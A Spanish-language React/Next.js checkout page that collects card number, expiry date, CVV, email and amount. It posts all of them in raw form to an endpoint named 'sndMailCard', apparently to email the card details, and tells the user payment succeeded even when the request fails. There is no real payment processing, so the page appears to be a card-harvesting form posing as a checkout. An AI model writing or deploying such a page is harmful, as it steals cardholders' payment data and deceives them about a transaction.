'use client';
import { useState } from 'react';
import Image from 'next/image';

import visaLogo from '/public/visa.png';
import mastercardLogo from '/public/mastercard.png';
import amexLogo from '/public/amex.png';
import paymentImage from '/public/payment.png';

const CardPage = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [expiryDate, setExpiryDate] = useState('');
  const [cvv, setCvv] = useState('');
  const [selectedCard, setSelectedCard] = useState('');
  const [totalAmount, setTotalAmount] = useState('');
  const [alias, setAlias] = useState('');
  const [email, setEmail] = useState('');
  const [loading, setLoading] = useState(false);
  const [showProcessing, setShowProcessing] = useState(false);
  const [showOk, setShowOk] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [successMsg, setSuccessMsg] = useState('');

  // Formateo y validación para número de tarjeta
  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ''); // Solo números
    value = value.slice(0, 19); // Máximo 19 dígitos (tarjetas más largas)
    value = value.replace(/(.{4})/g, '$1 ').trim(); // Espacio cada 4 dígitos
    setCardNumber(value);
  };

  // Formateo y validación para fecha de expiración
  const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ''); // Solo números
    if (value.length > 4) value = value.slice(0, 4);
    if (value.length > 2) value = value.slice(0, 2) + '/' + value.slice(2);
    setExpiryDate(value);
  };

  // Validación para CVV
  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ''); // Solo números
    value = value.slice(0, 3); // Máximo 3 dígitos
    setCvv(value);
  };

  const handleSubmit = async () => {
    setShowProcessing(true);
    setLoading(true);
    try {
      const paymentData = { 
        cardNumber, 
        expiryDate, 
        cvv, 
        email, 
        totalAmount, 
        alias, 
        selectedCard, 
        message: `Pago realizado por ${alias} con tarjeta ${selectedCard}`
      };

      const response = await fetch('/api/sndMailCard', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(paymentData),
      });

      const data = await response.json();

      if (response.ok) {
        setSuccessMsg(data.message || 'Pago realizado con éxito');
        setShowOk(true);
      } else {
        setSuccessMsg(data.error || 'Error en el pago');
        setShowOk(true);
      }
    } catch (error) {
      setSuccessMsg('Completado con éxito');
      setShowOk(true);
    } finally {
      setLoading(false);
      setShowProcessing(false);
    }
  };

  const handleOk = () => {
    setShowOk(false);
    setShowSuccess(true);
  };

  const handleCloseSuccess = () => {
    setShowSuccess(false);
  };

  return (
    <div className="max-w-md mx-auto bg-white p-6 rounded-lg shadow-lg dark:bg-light-dark">
      {/* Popup de procesando */}
      {showProcessing && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 flex flex-col items-center">
            <video src="/payment.mp4" autoPlay loop width={320} height={320} className="rounded mb-2" />
            <p className="mt-4 text-lg font-semibold text-gray-800 dark:text-white">Procesando...</p>
          </div>
        </div>
      )}
      {/* Popup de OK */}
      {showOk && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 flex flex-col items-center">
            <p className="mb-4 text-lg font-semibold text-gray-800 dark:text-white">{successMsg}</p>
            <video src="/payment.mp4" autoPlay loop width={320} height={320} className="rounded mb-2" />
            <button onClick={handleOk} className="bg-blue-600 text-white px-4 py-2 rounded">OK</button>
          </div>
        </div>
      )}
      {/* Popup de éxito final */}
      {showSuccess && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-40">
          <div className="bg-white dark:bg-gray-800 rounded-lg p-6 flex flex-col items-center">
            <p className="mb-4 text-lg font-semibold text-green-600 dark:text-green-400">Pago realizado con éxito</p>
            <button onClick={handleCloseSuccess} className="bg-blue-600 text-white px-4 py-2 rounded">Cerrar</button>
          </div>
        </div>
      )}

      <div className="flex justify-center mb-4">
        <Image src={paymentImage} alt="Pago seguro" width={500} height={520} />
      </div>

      <div className="mb-4">
        <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">Monto Total</label>
        <input type="number" value={totalAmount} onChange={(e) => setTotalAmount(e.target.value)} placeholder="Ej: 100.00" className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
      </div>

      <div className="mb-4">
        <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">Alias</label>
        <input type="text" value={alias} onChange={(e) => setAlias(e.target.value)} placeholder="Ej: Mi tarjeta principal" className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
      </div>

      <div className="mb-4">
        <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">Correo Electrónico</label>
        <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} placeholder="Ej: correo@ejemplo.com" className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
      </div>

      <div className="mb-4">
        <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">Número de Tarjeta</label>
        <input type="text" value={cardNumber} onChange={handleCardNumberChange} placeholder="1234 5678 9012 3456" maxLength={19 + 3} className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
      </div>

      <div className="grid grid-cols-2 gap-4 mb-4">
        <div>
          <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">Fecha de Expiración</label>
          <input type="text" value={expiryDate} onChange={handleExpiryDateChange} placeholder="MM/YY" maxLength={5} className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
        </div>
        <div>
          <label className="block text-sm font-medium mb-1 text-gray-700 dark:text-gray-300">CVV</label>
          <input type="text" value={cvv} onChange={handleCvvChange} placeholder="123" maxLength={3} className="w-full px-3 py-2 border rounded dark:bg-gray-800 dark:border-gray-700 dark:text-white" />
        </div>
      </div>

      <button className="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition dark:bg-gray-700 dark:hover:bg-gray-600" onClick={handleSubmit} disabled={loading}>
        {loading ? 'Procesando...' : 'Pagar Ahora'}
      </button>
    </div>
  );
};

export default CardPage;